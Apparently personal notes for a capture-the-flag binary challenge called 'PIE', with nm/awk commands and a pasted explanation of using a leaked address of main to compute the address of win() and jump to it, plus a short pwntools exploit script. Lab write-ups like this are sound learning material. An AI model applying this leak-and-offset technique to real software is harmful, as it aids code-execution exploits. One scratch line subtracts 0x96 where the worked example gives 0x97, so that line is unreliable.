#
- nm: list symbols from object files
- objtdump: display information from object files

nm vuln | grep -E 'main|win'

nm vuln | awk '
/ main$/ { main=strtonum("0x"$1) }
/ win$/  { win=strtonum("0x"$1) }
END { print win - main }'


python3 -c "print(hex(0xYOUR_LEAKED_ADDRESS - 0x96))"

#

# Function Pointer
void (*foo)(void) = (void (*)())val;
foo();

# Savety Mech
signal(SIGSEGV, segfault_handler);
setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

# Verification of Protections
Since the challenge is literally called **"PIE"**, the `PIE enabled` result is the most important part of that `checksec` output. It means the **program's base address changes every single time you run it.**

### 1. PIE (Position Independent Executable) — **The Key**
When PIE is enabled, the binary is compiled like a shared library. It doesn't have a fixed "home" in memory (like `0x400000`).
* **The Challenge:** You can't just hardcode the address of `win()` from your local `objdump`.
* **The Gift:** The source code explicitly gives you `printf("Address of main: %p\n", &main);`. Since the entire program moves as one block, the **relative distance** between `main` and `win` is always the same.

### 2. NX (No-Execute)
This prevents you from writing your own malicious code (shellcode) into a buffer and running it. Because NX is on, you **must** use existing code already in the binary—which is exactly what jumping to the `win()` function does.

### 3. Canary Found
This is a "Stack Canary." It's a secret value placed on the stack to detect if a buffer has been overflowed. However, because this specific program lets you **directly input an address** into a function pointer (`foo = val`), you aren't overflowing a buffer. You are simply bypassing the stack entirely. The Canary won't stop you here.

### 4. Full RELRO (Relocation Read-Only)
This makes the Global Offset Table (GOT) read-only. It prevents you from overwriting the addresses of standard functions (like `printf`). Again, since we are using a direct jump to `win`, we don't need to worry about the GOT.

---

### How to Calculate the Target Address
To win, you need to find the "offset" (the distance) between `main` and `win` using your provided `vuln` binary.

1.  **Find the static addresses in the file:**
    ```bash
    nm vuln | grep -E 'main|win'
    ```
    *Let's say it shows:*
    * `0000000000001240 T main`
    * `00000000000011a9 T win`

2.  **Calculate the Offset:**
    The difference is: $1240 - 11a9 = 0x97$ (in hex).
    This means `win` is exactly `0x97` bytes *before* `main`.

3.  **Perform the Live Calculation:**
    * Run the program: `./vuln`.
    * It prints: `Address of main: 0x555555555240`.
    * Use a hex calculator (or Python) to subtract your offset: 
      `0x555555555240 - 0x97 = 0x5555555551a9`.
    * Enter `0x5555555551a9` when prompted.



---

### The Professional Way (Python Script)
Since doing hex math manually during a timer is stressful, you can use `pwntools`:

```python
from pwn import *

# 1. Load the binary to get the offsets automatically
elf = ELF('./vuln')
p = process('./vuln') # or remote('addr', port)

# 2. Receive the leaked address of main
p.recvuntil(b"Address of main: ")
main_leak = int(p.recvline(), 16)

# 3. Calculate win address: Leak - MainOffset + WinOffset
win_address = main_leak - elf.symbols['main'] + elf.symbols['win']

# 4. Send the address
p.sendline(hex(win_address))
print(p.recvall().decode())
```

**Would you like me to explain how to install `pwntools` on the webshell if you don't have it yet?**

# U+0016
Synchronous Idle control character
this character is hidden but gets injected if you use the keyboard shortcut Ctrl+V to paste.